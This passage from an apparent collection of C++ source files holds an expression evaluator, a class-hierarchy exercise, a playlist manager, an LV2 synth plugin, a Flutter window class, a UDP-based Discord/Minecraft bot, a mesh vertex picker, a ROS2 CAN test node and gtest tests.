operand2;\r\n\t\tcase '*':\r\n\t\t\treturn operand1 * operand2;\r\n\t\tcase '/':\r\n\t\t\treturn operand1 / operand2;\r\n\t\tcase '^':\r\n\t\t\treturn pow(operand1, operand2);\r\n\t\tcase 's':\r\n\t\t\treturn sin(operand2 * M_PI / 180.0);\r\n\t\tcase 'c':\r\n\t\t\treturn cos(operand2 * M_PI / 180.0);\r\n\t\tcase 't':\r\n\t\t\treturn tan(operand2 * M_PI / 180.0);\r\n\t\tcase 'l':\r\n\t\t\treturn log(operand2);\r\n\t\tcase 'q':\r\n\t\t\treturn sqrt(operand2);\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\nbool evaluate(string expr, double& result) {\r\n\tstack<double> operands;\r\n\tstack<char> operators;\r\n\tint i = 0;\r\n\tint len = expr.length();\r\n\twhile (i < len) {\r\n\t\tchar c = expr[i];\r\n\t\tif (isWhiteSpace(c)) {\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isInvalidChar(c)) {\r\n\t\t\treturn false;\r\n\r\n\t\t}\r\n\t\tif (isDigit(c)) {\r\n\t\t\tdouble operand;\r\n\t\t\tstringstream ss;\r\n\t\t\tss << c;\r\n\t\t\ti++;\r\n\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\tss << expr[i];\r\n\t\t\t\ti++;\r\n\t\t\t}\r\n\t\t\tss >> operand;\r\n\t\t\toperands.push(operand);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isOperator(c)) {\r\n\t\t\tif (c == '-' && (i == 0 || isOperator(expr[i - 1]) || isLeftParenthesis(expr[i - 1]))) {\r\n\t\t\t\tdouble operand;\r\n\t\t\t\tstringstream ss;\r\n\t\t\t\tss << '-';\r\n\t\t\t\ti++;\r\n\t\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\t\tss << expr[i];\r\n\t\t\t\t\ti++;\r\n\t\t\t\t}\r\n\t\t\t\tss >> operand;\r\n\t\t\t\toperands.push(operand);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\twhile (!operators.empty() && isOperatorHigherOrEqual(operators.top(), c)) {\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isLeftParenthesis(c)) {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isRightParenthesis(c)) {\r\n\t\t\tif (operators.empty()) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tchar op = operators.top();\r\n\t\t\twhile (!isLeftParenthesis(op)) {\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\top = operators.top();\r\n\t\t\t}\r\n\t\t\toperators.pop();\r\n\t\t\tif (!operators.empty() && (operators.top() == 's' || operators.top() == 'c' || operators.top() == 't' || operators.top() == 'l' || operators.top() == 'q')) {\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble operand = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(0, operand, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q') {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t}\r\n\twhile (!operators.empty()) {\r\n\t\tchar op = operators.top();\r\n\t\toperators.pop();\r\n\t\tif (isLeftParenthesis(op) || operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand2 = operands.top();\r\n\t\toperands.pop();\r\n\t\tif (operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand1 = operands.top();\r\n\t\toperands.pop();\r\n\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\toperands.push(result);\r\n\t}\r\n\tif (operands.empty()) {\r\n\t\treturn false;\r\n\t}\r\n\tresult = operands.top();\r\n\treturn true;\r\n}\r\n\r\nint main() {\r\n\tstring expr;\r\n\tcout << \"input an expression: \";\r\n\tgetline(cin, expr);\r\n\tdouble result;\r\n\tif (evaluate(expr, result)) {\r\n\t\tprintf(\"%lf\\n\", result);\r\n\t} else {\r\n\t\tcout << \"illegal expression!\" << endl;\r\n\t}\r\n    cout<<\"press any key to continue...\";\r\n    getchar();\r\n\treturn 0;\r\n}\r\n",
    "\ufeff#include <iostream>\r\n#include<vector>\r\nusing namespace std;\r\n\r\n\r\nclass ISuperSpeed abstract{\r\npublic:\r\n    virtual void SuperSpeed() = 0;\r\n    virtual ~ISuperSpeed() {};\r\n};\r\n\r\nclass ISuperPower abstract{\r\npublic:\r\n    virtual void SuperPower() = 0;\r\n    virtual ~ISuperPower() {};\r\n};\r\n\r\nclass IFly abstract {\r\npublic:\r\n    virtual void Fly() = 0;\r\n    virtual ~IFly() {};\r\n};\r\n\r\nclass IHighIntelect abstract{\r\npublic:\r\n    virtual void HaveIntelect() = 0;\r\n    virtual ~IHighIntelect() {};\r\n};\r\n\r\nclass ISayJokes abstract {\r\npublic:\r\n    virtual void SayJokes() = 0;\r\n    virtual ~ISayJokes() {};\r\n};\r\n\r\nclass IHaveLaserEye abstract {\r\npublic:\r\n    virtual void HaveLaserEye() = 0;\r\n    virtual ~IHaveLaserEye() {};\r\n};\r\n\r\nclass IHaveChuika abstract{\r\npublic:\r\n    virtual void HaveChuika() = 0;\r\n    virtual ~IHaveChuika() {};\r\n};\r\n\r\nclass IMakeLigtning abstract {\r\npublic:\r\n    virtual void MakeLigtning() = 0;\r\n    virtual ~IMakeLigtning() {};\r\n};\r\n\r\nclass Ability abstract : public IMakeLigtning, public IHaveChuika, public IHaveLaserEye, public ISayJokes, public IHighIntelect, public IFly, public ISuperPower, public ISuperSpeed {\r\npublic:\r\n    virtual ~Ability() {};\r\n    virtual void HaveChuika() override {\r\n        cout << \"I have chuika\\n\";\r\n    }\r\n    virtual void MakeLigtning() override {   \r\n        cout << \"I can make ligtning\\n\";\r\n    }\r\n    virtual void HaveLaserEye()override {\r\n        cout << \"I can shoot lasers by my eyes\\n\"; \r\n    }\r\n    virtual void SayJokes() override {\r\n        cout << \"I can say jokes\\n\";\r\n    }\r\n    virtual void Fly() override {\r\n        cout << \"I can fly\\n\";\r\n    }\r\n    virtual void HaveIntelect() override {\r\n        cout << \"I am very smart\\n\";\r\n    }\r\n    virtual void SuperPower() override {\r\n        cout << \"I am very strong\\n\";\r\n    }\r\n    virtual void SuperSpeed() override {\r\n        cout << \"I am very fast\\n\";\r\n    }\r\n};\r\n\r\nclass Good abstract {\r\npublic:\r\n    virtual void DoGoodThings(string thing) = 0;\r\n    virtual ~Good() {};\r\n};\r\n\r\nclass Bad abstract {\r\npublic:\r\n    virtual void DoBadThings(string thing) = 0;\r\n    virtual ~Bad() {};\r\n};\r\n\r\nclass God abstract : protected Ability {\r\n    /*string name;*/\r\n    int count = 0;\r\n    string life = \"infinity\";   \r\n    vector <void (Ability::*)()> abilities;     \r\npublic:\r\n    \r\n    God() {\r\n        //cout << \"God\\n\";\r\n    }\r\n\r\n    virtual ~God() {}\r\n\r\n    string GetLife()\r\n    {\r\n        return life;\r\n    }\r\n\r\n    int GetCount() {\r\n        return count;\r\n    }\r\n\r\n    void AddAbility(void(Ability::* ability)())\r\n    {\r\n        //void* method = *(void**)(&abilitie);\r\n        abilities.push_back(ability);\r\n        count++;\r\n    }\r\n\r\n    auto Search(void(Ability::* ability)())\r\n    {\r\n        for (int i = 0; i < count; i++)\r\n        {\r\n            if (ability == abilities[i]) {\r\n                return 1;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    void ShowAbilities()\r\n    {\r\n        for (auto ability : abilities)\r\n        {\r\n            if (ability == &Ability::Fly)\r\n                cout << \"Fly \";\r\n            else if (ability == &Ability::HaveIntelect)\r\n                cout << \"High Intelect \";\r\n            else if (ability == &Ability::HaveChuika)\r\n                cout << \"Chuika \";\r\n            else if (ability == &Ability::HaveLaserEye)\r\n                cout << \"Laser eyes \";\r\n            else if (ability == &Ability::MakeLigtning)\r\n                cout << \"Throw Ligtning \";\r\n            else if (ability == &Ability::SayJokes)\r\n                cout << \"Say some jokes \";\r\n            else if (ability == &Ability::SuperPower)\r\n                cout << \"Super power \";\r\n            else if (ability == &Ability::SuperSpeed)\r\n                cout << \"Super speed \";\r\n            //(this->*ability)();\r\n        }\r\n        cout << \"\\n\";\r\n    }\r\n    \r\n};\r\n\r\nclass People abstract : protected Ability{ \r\n    /*string name;*/\r\n    int life;\r\n    vector <void (Ability::*)()> abilities;\r\n    int count = 0;\r\npublic:\r\n\r\n    People() {\r\n       // cout << \"People\\n\";\r\n    }\r\n\r\n    virtual ~People() {}\r\n\r\n    void SetLife(int life) {\r\n        this->life = life;\r\n    }\r\n\r\n    int GetLife() {\r\n        return life;\r\n    }\r\n    \r\n    int GetCount(){\r\n        return count;\r\n    }\r\n\r\n    auto Search(void(Ability::* ability)())\r\n    {\r\n        for (int i = 0; i < count; i++)\r\n        {\r\n            if (ability == abilities[i]) {\r\n                return 1;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    void AddAbility(void (Ability::* ability)()) {\r\n        abilities.push_back(ability);\r\n        count++;       \r\n    }\r\n\r\n    void ShowAbility() {\r\n        for (auto ability : abilities)\r\n        {\r\n            /*(this->*ability)();*/\r\n            if (ability == &Ability::Fly)\r\n                cout << \"Fly \";\r\n            else if (ability == &Ability::HaveIntelect)\r\n                cout << \"High Intelect \";\r\n            else if (ability == &Ability::HaveLaserEye)\r\n                cout << \"Laser eyes \";\r\n            else if (ability ==",
    "#include \"Playlist.h\"\n#include \"HelpFunctions.h\"\n#include <iostream>\n#include <fstream>\n\nbool Playlist::addSong(const char* name,size_t duration,\n\t\t\t\t\t   const char* genre, const char* fileName)\n{\n\tif (songsInPlaylist >= MAX_SONGS_IN_PLAYLIST)\n\t{\n\t\treturn false;\n\t}\n\n\tstd::ifstream file(fileName, std::ios::binary);\n\tif (!file.is_open()) \n\t{\n\t\treturn false;\n\t}\n\n\tsize_t fileSize = getFileSize(file);\n\tchar* buffer = new char[fileSize + 1];\n\tfile.read(buffer, fileSize);\n\tbuffer[fileSize] = '\\0';\n\n\tplaylist[songsInPlaylist].setContent(buffer);\n\tplaylist[songsInPlaylist].setName(name);\n\tplaylist[songsInPlaylist].setDuration(duration);\n\tplaylist[songsInPlaylist].setGenre(genre);\n\tsongsInPlaylist++;\n\n\tdelete[] buffer;\n\tfile.close();\n\treturn true;\n}\n\nvoid Playlist::printPlaylist() const\n{\n\tfor (short i = 0; i < songsInPlaylist; i++)\n\t{\n\t\tstd::cout << '[' << i + 1 << \"] \";\n\t\tplaylist[i].printSong();\n\t\tstd::cout << '\\n';\n\t}\n}\n\nbool Playlist::searchByName(const char* name) const\n{\n\tfor (short i = 0; i < songsInPlaylist; i++)\n\t{\n\t\tif (!strcmp(playlist[i].getName(), name))\n\t\t{\n\t\t\tplaylist[i].printSong();\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nvoid Playlist::sortDatabase(bool(*isLess)(const Song& lhs, const Song& rhs))\n{\n\tfor (short i = 0; i < songsInPlaylist; i++)\n\t{\n\t\tint minIndex = i;\n\t\tfor (int j = i + 1; j < songsInPlaylist; j++)\n\t\t{\n\t\t\tif (isLess(playlist[j], playlist[minIndex]))\n\t\t\t\tminIndex = j;\n\n\t\t}\n\t\tif (i != minIndex)\n\t\t\tstd::swap(playlist[i], playlist[minIndex]);\n\t}\n}\n\nvoid Playlist::sortByName()\n{\n\tsortDatabase([](const Song& lhs, const Song& rhs) { return strcmp(lhs.getName(), rhs.getName()) < 0;});\n}\n\nvoid Playlist::sortByDuration()\n{\n\tsortDatabase([](const Song& lhs, const Song& rhs) { return lhs.getDuration() < rhs.getDuration(); });\n}\n\nbool Playlist::findByName(const char* name) const\n{\n\tfor (short i = 0; i < songsInPlaylist; i++)\n\t{\n\t\tif (!strcmp(playlist[i].getName(), name))\n\t\t{\n\t\t\tplaylist[i].printSong();\n\t\t\tstd::cout << '\\n';\n\t\t\treturn true;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nvoid Playlist::findByGenre(char genre) const\n{\n\tchar mask = 0;\n\tswitch (genre)\n\t{\n\t\tcase 'r': mask = mask | (1 << Genre::r); break;\n\t\tcase 'p': mask = mask | (1 << Genre::p); break;\n\t\tcase 'h': mask = mask | (1 << Genre::h); break;\n\t\tcase 'e': mask = mask | (1 << Genre::e); break;\n\t\tcase 'j': mask = mask | (1 << Genre::j); break;\n\t\tdefault: break;\n\t}\n\n\tif (mask != 0)\n\t{\n\t\tfor (short i = 0; i < songsInPlaylist; i++)\n\t\t{\n\t\t\tif ((playlist[i].getGenre() & mask) != 0)\n\t\t\t{\n\t\t\t\tplaylist[i].printSong();\n\t\t\t\tstd::cout << '\\n';\n\t\t\t}\n\t\t}\n\n\t}\n}\n\nshort Playlist::getSongIndexByName(const char* name) const\n{\n\tfor (short i = 0; i < songsInPlaylist; i++)\n\t{\n\t\tif (!strcmp(playlist[i].getName(), name))\n\t\t{\n\t\t\treturn i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn -1;\n}\n\nbool Playlist::mixSongs(const char* name1, const char* name2)\n{\n\tshort song1index = getSongIndexByName(name1);\n\tshort song2index = getSongIndexByName(name2);\n\n\tif (song1index != -1 && song2index != -1)\n\t{\n\t\tif (playlist[song1index].mix(playlist[song2index]))\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nbool Playlist::changeSongRhythm(const char* name, unsigned int index)\n{\n\tshort songIndex = getSongIndexByName(name);\n\n\tif (songIndex != -1)\n\t{\n\t\tif (playlist[songIndex].changeRhythm(index))\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nbool Playlist::saveSongToFile(const char* song, const char* fileName) const\n{\n\tshort songIndex = getSongIndexByName(song);\n\n\tstd::ofstream file(fileName,std::ios::binary);\n\n\tif (!file.is_open()) {\n\t\treturn false;\n\t}\n\n\tfile.write((const char*)playlist[songIndex].getContent(),sizeof(char)*(playlist[songIndex].getContentSize()));\n\tfile.close();\n\treturn true;\n}",
    "/*libs*/\n#include <cstddef>\n#include <cstdint>\n#include <cstdlib>\n#include <cmath>\n#include <lv2.h>\n#include <lv2/atom/atom.h>\n#include <lv2/atom/util.h>\n#include <lv2/urid/urid.h>\n#include <lv2/midi/midi.h>\n#include <lv2/core/lv2_util.h>\n\n#define u8 uint8_t\n#define u32 uint32_t\n\nenum ADSRPorts {\n    ADSR_ATTACK = 0,\n    ADSR_DECAY = 1,\n    ADSR_SUSTAIN = 2,\n    ADSR_RELEASE = 3,\n    ADSR_LEVEL = 4,\n    ADSR_NR = 5,\n};\n\nenum IOPorts {\n    IO_MIDI_IN = 0,\n    IO_AUDIO_OUT = 1,\n    IO_CONTROL = 2,\n    IO_NR = 3,\n};\n\nstruct Urids {\n    LV2_URID midi_MidiEvent;\n};\n\nenum KeyStatus {\n    KEY_OFF = 0,\n    KEY_PRESSED = 1,\n    KEY_RELEASED = 2,\n};\n\nstruct Envelope {\n    double attack;\n    double decay;\n    float sustain;\n    double release;\n};\n\nclass Key {\n\n    private:\n\n        KeyStatus status;\n        u8 note;\n        u8 velocity;\n        Envelope envelope;\n        double rate;\n        double position;\n        float start_lever;\n        double freq;\n        double time;\n\n        float adsr() {\n\n            switch (status) {\n\n                case KEY_PRESSED:\n\n                    if(time < envelope.attack) {\n\n                        return start_lever + (1 -start_lever) * time / envelope.attack;\n\n                    }\n\n                    if(time < envelope.attack + envelope.decay) {\n\n                        return 1 + (envelope.sustain - 1) * (time - envelope.attack) / envelope.decay;\n\n                    }\n\n                    return envelope.sustain;\n\n                    break;\n\n                case KEY_RELEASED:\n\n                    return start_lever - start_lever * time / envelope.release;\n\n                    break;\n\n                default:\n\n                    return 0;\n\n                    break;\n\n            }\n\n        }\n\n    public:\n\n        Key(const double rt) {\n\n            status = KEY_OFF;\n            note = 0;\n            velocity = 0;\n            envelope = {0, 0, 0, 0};\n            position = 0;\n            start_lever = 0;\n            rate = rt;\n            freq = pow(2, (double (note) - 69) / 12) * 440;\n            time = 0;\n\n        }\n\n        void press(u8 nt, const u8 v, const Envelope e) {\n\n            start_lever = adsr();\n            note = nt;\n            velocity = v;\n            envelope = e;\n            status = KEY_PRESSED;\n            freq = pow(2, (double (note) - 69) / 12) * 440;\n            time = 0;\n\n        }\n\n        void release(const u8 nt, const u8 v) {\n\n            if (status == KEY_PRESSED && note == nt) {\n\n                start_lever = adsr();\n                status = KEY_RELEASED;\n                time = 0;\n\n            }\n\n        }\n\n        void off() {\n\n            position = 0;\n            status = KEY_OFF;\n\n        }\n\n\n        float get() {\n\n            float synth_note = adsr() * sin(2 * M_PI * position) * (float(velocity) / 127);\n\n            return synth_note;\n\n        }\n\n        void proceed() {\n\n            position = freq / rate;\n            time = 1 / rate;\n\n            if (status == KEY_RELEASED && time >= envelope.release) {\n                \n                off();\n            \n            }\n            \n\n        }\n\n};\n\nclass Synth {\n\n    private:\n\n        const LV2_Atom_Sequence* midi_in_ptr;\n        float* audio_out_ptr;\n        const float *adsr_ptr[ADSR_NR];\n        double rate;\n        double position;\n        LV2_URID_Map *map;\n        Urids urids;\n        Key* key;\n\n        void play(const u32 start, const u32 end) {\n\n            for(u32 i=start; i < end; i++) {\n\n                audio_out_ptr[i] = key->get() * *adsr_ptr[ADSR_LEVEL];\n                key->proceed();\n\n            }\n\n        }\n\n\n    public:\n\n        Synth(const double sample_rate, const LV2_Feature *const *features) {\n\n            midi_in_ptr = (nullptr);\n            audio_out_ptr = (float*) nullptr;\n\n            for (u32 i=0; i < ADSR_NR; i++) {\n\n                adsr_ptr[i] = (nullptr);\n            \n            }\n            \n            rate = sample_rate;\n            position = 0.0;\n            key = new Key(rate);\n\n            map = (nullptr);\n\n            const char *missing = lv2_features_query(\n                features,\n                LV2_URID__map, &map, true,\n                NULL\n            );\n\n            if (missing) {\n\n                throw;\n            \n            }\n\n            urids.midi_MidiEvent = map->map(map->handle, LV2_MIDI__MidiEvent);\n            \n        }\n\n        //-Synth(); i use the default c++ destructor\n        \n        void connectPort(const u32 port, void* data_location) {\n\n            switch (port) {\n\n                case IO_MIDI_IN:\n                    midi_in_ptr = (const LV2_Atom_Sequence*) data_location;\n                    break;\n\n                case IO_AUDIO_OUT:\n                    audio_out_ptr = (float*) data_location;\n                    break;\n\n                default:\n\n                    if (port < IO_CONTROL + ADSR_NR) {\n\n                        adsr_ptr[port - IO_CONTROL] = (const float*) data_location;\n                    \n           ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"mcbot.h\"\n#include <thread>\n#include <chrono>\n\nconst char* t = \"********************\";//Discord bot token, replace with own token\nMCBot *instance;\n\nint main()\n{\n    instance = new MCBot(t);\n\n    auto c_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    //auto s_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    auto status_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    auto c_socket_out = socket(AF_INET, SOCK_DGRAM, 0);\n    auto s_socket_out = socket(AF_INET, SOCK_DGRAM, 0);\n\n    sockaddr_in creative, survival, creative_out, survival_out, status;\n    set_sockaddr(creative, 60009);\n    //set_sockaddr(survival, 60010);\n    set_sockaddr(status, 60010);\n    set_sockaddr(creative_out, 60019);\n    set_sockaddr(survival_out, 60020);\n\n    bind(c_socket, (sockaddr*)&creative, sizeof creative);\n    bind(status_socket, (sockaddr*)&status, sizeof status);\n    //bind(s_socket, (sockaddr*)&survival, sizeof survival);\n\n    char buffer[257] = { 0 };\n    ssize_t bytes_read;\n\n    instance->s_socket_out = s_socket_out;\n    instance->c_socket_out = c_socket_out;\n\n    while (instance != nullptr) \n    {\n        if ((bytes_read = recv(c_socket, buffer, 257, MSG_DONTWAIT)) != -1)\n        {\n            buffer[256] = '\\0';\n            instance->str_vec.push_back(buffer + 1);\n            instance->msg_callback(buffer[0]);\n            instance->str_vec.clear();\n            memset(buffer, 0, 257);\n        }\n        if ((bytes_read = recv(status_socket, buffer, 257, MSG_DONTWAIT)) != -1)\n        {\n            buffer[256] = '\\0';\n            instance->str_vec.push_back(buffer + 1);\n            instance->status_callback(buffer[0]);\n            instance->str_vec.clear();\n            memset(buffer, 0, 257);\n        }\n        /*if ((bytes_read = recv(s_socket, buffer, 256, MSG_DONTWAIT)) != -1)\n        {\n            buffer[255] = '\\0';\n            instance->str_vec.push_back(buffer);\n            instance->msg_callback(false);\n            instance->str_vec.clear();\n            memset(buffer, 0, 256);\n        }*/\n        std::this_thread::sleep_for(std::chrono::milliseconds(1));\n    }\n\n    std::cout << \"\\nShutting down instance...\\n\";\n    close(c_socket);\n    close(status_socket);\n    //close(s_socket);\n    return 0;\n}\n",
    "#include <pick_nearest_vertices.h>\n#include <iostream>\n#include <igl/Hit.h>\n#include <igl/ray_mesh_intersect.h>\n#include <igl/unproject.h>\n\n// copied\nbool pick_nearest_vertices(\n        std::vector<unsigned int> &verts,\n        Eigen::Ref<const Eigen::Vector3d> win,\n        Eigen::Ref<const Eigen::Matrix44f> view,\n        Eigen::Ref<const Eigen::Matrix44f> proj,\n        Eigen::Vector4f viewport,\n        Eigen::Ref<const Eigen::MatrixXd> V,\n        Eigen::Ref<const Eigen::MatrixXi> F,\n        double radius) {\n    verts.clear();\n\n    // Source, destination and direction in world\n    Eigen::Vector3f start, dir;\n    Eigen::Vector3f win_0(win(0), win(1), win(2));\n    Eigen::Vector3f win_1(win(0), win(1), 1.);\n\n\n    igl::unproject(win_0, view, proj, viewport, start);\n    igl::unproject(win_1, view, proj, viewport, dir);\n    dir -= start;\n\n    igl::Hit hit;\n\n    const auto& shoot_ray = [&V, &F](const Eigen::Vector3f& s, const Eigen::Vector3f& dir, igl::Hit& hit)->bool\n    {\n        std::vector<igl::Hit> hits;\n\n        if (!igl::ray_mesh_intersect(s, dir, V, F, hits))\n        {\n            return false;\n        }\n        hit = hits[0];\n        return true;\n    };\n\n    if (!shoot_ray(start, dir, hit))\n    {\n        return false;\n    }\n\n    Eigen::Vector3f bc;\n    bc << 1.0 - hit.u - hit.v, hit.u, hit.v;\n    unsigned int fid = hit.id;\n\n    long c;\n    bc.maxCoeff(&c);\n    unsigned int vid = F(fid, c);\n\n    for (unsigned int qi = 0; qi < V.rows(); qi++) {\n        if ((V.row(qi) - V.row(vid)).norm() < radius) {\n\n            verts.push_back(qi);\n        }\n    }\n\n    return (verts.size() == 0 ? false : true);\n\n}",
    "#include \"can_transceiver/ros2can_transceiver.h\"\n\nusing namespace std::chrono_literals;\nTestNode::TestNode() : rclcpp::Node(\"test_node_canlib\"), canlib::Transceiver() {}\n\nTestNode::TestNode(std::string device_name, std::vector<can_filter> filters)\n    : rclcpp::Node(\"test_node_canlib\"), canlib::Transceiver(device_name, filters) {\n  m_brake_ratio = 0.0;\n  m_lap_count = 0.0;\n  // Use callbacks to customize the decoding of the incoming data\n  canlib::callback::can1::jetson_commands = [&](can1_jetson_commands_t /*frame_encoded*/,\n                                                canlib::frame::decoded::can1::jetson_commands_t frame_decoded) {\n    RCLCPP_INFO(this->get_logger(), \"received jetson_commands: brake ratio = %lf\", frame_decoded.jetson_brake_ratio);\n    m_brake_ratio = frame_decoded.jetson_brake_ratio;\n  };\n  canlib::callback::can1::jetson_tx = [&](can1_jetson_tx_t /*frame_encoded*/, canlib::frame::decoded::can1::jetson_tx_t frame_decoded) {\n    RCLCPP_INFO(this->get_logger(), \"received jetson_tx: lap count = %lf\", frame_decoded.jetson_lap_count);\n    m_lap_count = frame_decoded.jetson_lap_count;\n  };\n\n  // Use a thread to continuously update the can messages\n  std::thread receiver([this]() {\n    RCLCPP_INFO(this->get_logger(), \"starting CAN receiver ...\");\n    this->is_receiver_running = true;\n    while (rclcpp::ok()) {\n      mtx.lock();\n      if (receive()) {\n        RCLCPP_INFO(this->get_logger(), \"received data\");\n      }\n      mtx.unlock();\n    }\n    RCLCPP_INFO(this->get_logger(), \"shutdown CAN receiver ...\");\n    this->is_receiver_running = false;\n  });\n\n  // Just for an example send contnuosly data\n  std::thread transmitter([this]() {\n    RCLCPP_INFO(this->get_logger(), \"starting CAN transmitter ...\");\n    this->is_transmitter_running = true;\n    while (rclcpp::ok()) {\n      transmit(canlib::frame::decoded::can1::jetson_commands_t(0.1, 0.2, 0.3, 0.4, 0.5));\n      RCLCPP_INFO(this->get_logger(), \"current lap count: %lf\", m_lap_count);\n      sleep(1);\n    }\n    RCLCPP_INFO(this->get_logger(), \"shutdown CAN transmitter ...\");\n    this->is_transmitter_running = false;\n  });\n\n  receiver.detach();\n  transmitter.detach();\n  RCLCPP_INFO(this->get_logger(), \"init success\");\n}\n\nTestNode::~TestNode() {\n  RCLCPP_INFO(this->get_logger(), \"destructor called\");\n  while (is_receiver_running || is_transmitter_running) {\n    if (is_receiver_running) RCLCPP_INFO(this->get_logger(), \"CAN receiver is still running\");\n    if (is_transmitter_running) RCLCPP_INFO(this->get_logger(), \"CAN transmitter is still running\");\n    sleep(1);\n  }\n}\n\nint main(int argc, char* argv[]) {\n  rclcpp::init(argc, argv);\n  // Setup filters\n  std::vector<can_filter> filters;\n  can_filter filter;\n  filter.can_id = 0x0E2;\n  filter.can_mask = CAN_SFF_MASK;\n  filters.push_back(filter);\n  filter.can_id = 0x0E1;\n  filter.can_mask = CAN_SFF_MASK;\n  filters.push_back(filter);\n  // Set device name\n  std::string device_name = \"vcan0\";\n  // Start ROS Node\n  rclcpp::spin(std::make_shared<TestNode>(device_name, filters));\n  rclcpp::shutdown();\n  return 0;\n}",
    "#include <gtest/gtest.h>\n#include \"DirEntry.h\"\n#include \"Exceptions.h\"\n\nbool operator==(const DirEntry& left, const DirEntry& right)\n{\n  return 0 == memcmp(&left, &right, sizeof(DirEntry));\n}\n\nTEST(ShouldThrowExceptionIfDirFileNotReadable, DirEntryTests)\n{\n  EXPECT_THROW({\n    DirEntry::ParseDirFile(\"non_existing\");\n  }, CouldNotReadFile);\n}\n\nTEST(ShouldReadValidDirFileCorrectly, DirEntryTests)\n{\n  const auto result = DirEntry::ParseDirFile(\"valid1.dir\");\n\n  const std::vector<DirEntry> expected = {\n    {\n      .sectorStart = 3,\n      .sectorCount = 5,\n      .fileName = \"derp\"\n    },\n    {\n      .sectorStart = 5,\n      .sectorCount = 256,\n      .fileName = \"foo.bar\"\n    },\n  };\n\n  EXPECT_EQ(expected, result);\n}\n\nTEST(ShouldThrowExceptionIfDirFileSizeIsWrong, DirEntryTests)\n{\n  EXPECT_THROW({\n    DirEntry::ParseDirFile(\"invalid1.dir\");\n  }, UnexpectedEof);\n}\n\nTEST(ShouldReadDirWithDuplicateNamesCorrectly, DirEntryTests)\n{\n  const auto result = 